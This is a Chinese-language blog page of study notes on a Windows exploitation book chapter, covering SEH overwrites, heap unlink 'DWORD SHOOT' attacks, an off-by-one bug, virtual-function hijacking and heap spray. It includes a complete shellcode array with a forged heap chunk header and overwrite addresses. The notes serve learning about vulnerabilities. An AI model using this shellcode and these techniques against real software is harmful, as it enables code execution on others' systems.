@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="notes about chapter 6from 6.1Windows针对异常会使用异常处理结构体SEH：      Dword:Next SEH Header（低地址） SEH链表指针    Dword:Exception Handler（高地址） 异常处理函数句柄">
+<meta property="og:type" content="article">
+<meta property="og:title" content="note chapter 6">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;index.html">
+<meta property="og:site_name" content="Ivoripuion&#39;s blog">
+<meta property="og:description" content="notes about chapter 6from 6.1Windows针对异常会使用异常处理结构体SEH：      Dword:Next SEH Header（低地址） SEH链表指针    Dword:Exception Handler（高地址） 异常处理函数句柄">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;SEH.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;expaddr.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;shellcode2.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;shellcode1.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;ds_1.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;ds_2.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;ds_3.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;offbyone.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;attack_virtual.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;success1.JPG">
+<meta property="og:updated_time" content="2021-02-22T07:53:39.567Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-6&#x2F;SEH.JPG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/02/22/0day-6/"/>
+
+
+
+
+
+  <title>note chapter 6 | Ivoripuion's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ivoripuion's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/pwn" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/reverse" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            reverse
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-《0-day》笔记">
+          <a href="/categories/note1" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            《0 day》笔记
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-《加密与解密》笔记">
+          <a href="/categories/note2" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            《加密与解密》笔记
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-随想">
+          <a href="/categories/%E9%9A%8F%E6%83%B3" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            随想
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/22/0day-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">note chapter 6</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-22T15:50:46+08:00">
+                2021-02-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/note1/" itemprop="url" rel="index">
+                    <span itemprop="name">note1</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="notes-about-chapter-6"><a href="#notes-about-chapter-6" class="headerlink" title="notes about chapter 6"></a>notes about chapter 6</h1><h2 id="from-6-1"><a href="#from-6-1" class="headerlink" title="from 6.1"></a>from 6.1</h2><p>Windows针对异常会使用异常处理结构体SEH：  </p>
+<table>
+<thead>
+<tr>
+<th>Dword:Next SEH Header（低地址）</th>
+<th>SEH链表指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Dword:Exception Handler（高地址）</td>
+<td>异常处理函数句柄</td>
+</tr>
+</tbody></table>
+<a id="more"></a>
+
+<p>有关SEH的一些概念：</p>
+<ol>
+<li>SEH结构体存放在系统栈中。</li>
+<li>当线程初始化，会向栈中安置一个SEH，作为线程的默认异常处理。</li>
+<li>如果程序源代码中使用了<strong>try{}</strong>except{}或者Assert 宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H 来实现异常处理。</li>
+<li>栈中会有多个SEH。</li>
+<li>栈中的多个SEH通过链表指针在栈内由栈顶向栈底串成单向链表，链表顶端的SEH通过TEB 0字节的偏移的指针标识。</li>
+<li>当异常发生时，操作系统会中断程序，并首先从T.E.B 的0 字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。</li>
+<li>当离“事故现场”最近的异常处理函数运行失败时，将顺着S.E.H 链表依次尝试其他的异常处理函数。</li>
+<li>当程序安装的所有SEH都处理不了，就使用（2中所述）默认的SEH，这时一般就会弹出错误对话框。  </li>
+</ol>
+<p><img src="/2021/02/22/0day-6/SEH.JPG" alt="SEHInStack"></p>
+<p>由于SEH位于栈中，所以在有溢出的漏洞时，我们可以覆盖handle的address为shellcode的起始地址，而溢出后错误的栈桢或者堆块会触发异常，此时就会执行shellcode。</p>
+<h3 id="exp-in-P205"><a href="#exp-in-P205" class="headerlink" title="exp in P205"></a>exp in P205</h3><p>这里的栈桢中的SEH：  </p>
+<p><img src="/2021/02/22/0day-6/expaddr.JPG" alt="expaddr"></p>
+<p>这里我们的shellcode距离SEH的handle的地址为：212。<br>填充完成后堆栈：<br><img src="/2021/02/22/0day-6/shellcode2.JPG" alt="shellcode2"><br><img src="/2021/02/22/0day-6/shellcode1.JPG" alt="shellcode1"><br>可以看到我们已经把处理函数的地址覆盖为shellcode的起始地址了。然而我的win2003 server实验机没有出现弹窗，即win2003 server中加入了对SEH的安全校验，因此会导致实验失败。</p>
+<h3 id="exp-in-209"><a href="#exp-in-209" class="headerlink" title="exp in 209"></a>exp in 209</h3><p>此时shellcode在堆块中的地址为0x00390688：<br><img src="/2021/02/22/0day-6/ds_1.JPG" alt><br>shellcode构造如下:  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">char shellcode[]=</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span><br><span class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span><br><span class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span><br><span class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span><br><span class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span><br><span class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span><br><span class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span><br><span class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span><br><span class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span><br><span class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span><br><span class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;// head of the ajacent free block</span><br><span class="line">&quot;\x88\x06\x39\x00&quot;//0x00390688 is the address of shellcode in first</span><br><span class="line">//Heapblock</span><br><span class="line">&quot;\x90\x90\x90\x90&quot;;//target of DWORD SHOOT</span><br></pre></td></tr></table></figure>
+
+<p>这里的shellcode的块的起始地址为0x00390688，所以下一个堆块的块首地址就是0x00390688+200+8=0x00390750，flink的地址为0x00390750+8=0x00390758，blink地址为0x00390758+8=0x00390760：  </p>
+<p><img src="/2021/02/22/0day-6/ds_2.JPG" alt>  </p>
+<p>将flink地址填充为shellcode起始地址，将blink暂定为0x90909090，调试以后填为SEH的地址，这样就可以将shellcode地址填入SEH地址中，当异常产生，将调用shellcode。  </p>
+<p>然后根据文档继续调试，到这里看到栈顶的SEH地址：<br><img src="/2021/02/22/0day-6/ds_3.JPG" alt></p>
+<p>将blink地址填充为该地址，将int3去除，重新编译成release运行就可以看到弹窗跳出，这里由于是win2003，故实验失败。  </p>
+<p>异常处理流程总体如下：</p>
+<ol>
+<li>首先使用栈顶的SEH中的handle去处理。</li>
+<li>失败了根据SEH链表一次执行后续的异常处理函数。</li>
+<li>都没有处理成功的话，执行<strong>进程</strong>中的异常处理。</li>
+<li>都失败了，系统默认的异常处理被调用，程序奔溃出现对话框。</li>
+</ol>
+<p>异常处理函数一般有两个返回值：</p>
+<ol>
+<li>返回值为0：异常处理成功，返回原程序发生异常的地方，继续执行后续的指令。</li>
+<li>返回值为1：异常处理失败，顺着SEH继续尝试处理异常。</li>
+</ol>
+<p>线程异常处理中的unwind操作：当顺着SEH找到合适的处理句柄时，系统将会对已经遍历过的SEH中的异常处理函数再调用一遍，目的是“通知”前边处理异常失败的SEH，系统已经准备将它们“遗弃”了，请它们立刻清理现场，释放资源，之后这些SEH结构体将被从链表中拆除。这可以避免当程序继续进行时，一系列的压栈操作后，前面的SEH被破坏，此时再发生异常，仍然会从前面的SEH开始寻求方法，这时候就可能发生错误。</p>
+<p>线程发生的异常没有被线程的异常处理函数或者调试器处理，会最终交付给进程中的异常处理函数处理。进程中的异常处理函数得返回值：  </p>
+<ol>
+<li>返回值为1：错误得到正确处理，程序<strong>退出</strong>。</li>
+<li>返回值为0：无法处理错误，错误交付给系统默认异常处理。</li>
+<li>返回值为-1：错误得到正确处理，程序将继续进行。</li>
+</ol>
+<p>当进行异常处理函数都无法处理时，系统默认的异常处理函数UnhandledExceptionFilter()会被调用，即所谓的UEF。这里windows相关的UEF配置一般就在注册表HKLM\SOFTWARE\Microsoft\WindowsNT<br>CurrentVersion\AeDebug中配置。win10在\计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug中配置。</p>
+<h2 id="from-6-2"><a href="#from-6-2" class="headerlink" title="from 6.2"></a>from 6.2</h2><p>offbyone：</p>
+<pre><code class="C"><span class="function"><span class="keyword">void</span> <span class="title">off_by_one</span><span class="params">(<span class="keyword">char</span> * input)</span></span>
+<span class="function"></span>{
+    <span class="keyword">char</span> buf[<span class="number">200</span>];
+    <span class="keyword">int</span> i=<span class="number">0</span>,len=<span class="number">0</span>;
+    len=<span class="keyword">sizeof</span>(buf);
+    <span class="keyword">for</span>(i=<span class="number">0</span>; input[i]&amp;&amp;(i&lt;=len); i++)
+    {
+    buf[i]=input[i];
+}
+    ……
+}</code></pre>
+<p>这里的代码产生了数组越界，使得我们可以控制一个字节的地址。如果缓冲区的后面就是EBP，那我们就可以控制EBP的最后一个字节，从而在[0,255]（[0x00,0xFF]）的范围内移动EBP，然后劫持到shellcode的地方即可。</p>
+<p>这里调试了下，本来的想法就是将ebp劫持到shellcode某个地方，然后后面接shellcode起始地址为EIP，调试后发现只修改一个字节是劫持不到的：<br><img src="/2021/02/22/0day-6/offbyone.JPG" alt></p>
+<p>可以看到再加一个字节的data也远到不了ebp的位置。</p>
+<h2 id="from-6-3"><a href="#from-6-3" class="headerlink" title="from 6.3"></a>from 6.3</h2><p>调试结果如下：<br><img src="/2021/02/22/0day-6/attack_virtual.JPG" alt="1"><br>运行后，虚函数定位到了0x0040881C，也就是shellcode的起始地址：<br><img src="/2021/02/22/0day-6/success1.JPG" alt="2">  </p>
+<h2 id="from-6-4"><a href="#from-6-4" class="headerlink" title="from 6.4"></a>from 6.4</h2><p>简单来说就是用nop区域覆盖掉0x0C0C0C0C，然后当EIP运行到这里的时候，就会继续往下走，走到shellcode的地方。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/22/0day-5/" rel="next" title="note chapter 5">
+                <i class="fa fa-chevron-left"></i> note chapter 5
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/02/22/0day-8/" rel="prev" title="note chapter 8">
+                note chapter 8 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/me.jpg"
+                alt="Ivoripuion" />
+            
+              <p class="site-author-name" itemprop="name">Ivoripuion</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ivoripuion" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1711268@mail.nankai.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#notes-about-chapter-6"><span class="nav-number">1.</span> <span class="nav-text">notes about chapter 6</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#from-6-1"><span class="nav-number">1.1.</span> <span class="nav-text">from 6.1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-in-P205"><span class="nav-number">1.1.1.</span> <span class="nav-text">exp in P205</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-in-209"><span class="nav-number">1.1.2.</span> <span class="nav-text">exp in 209</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#from-6-2"><span class="nav-number">1.2.</span> <span class="nav-text">from 6.2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#from-6-3"><span class="nav-number">1.3.</span> <span class="nav-text">from 6.3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#from-6-4"><span class="nav-number">1.4.</span> <span class="nav-text">from 6.4</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ivoripuion</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":225,"height":450},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
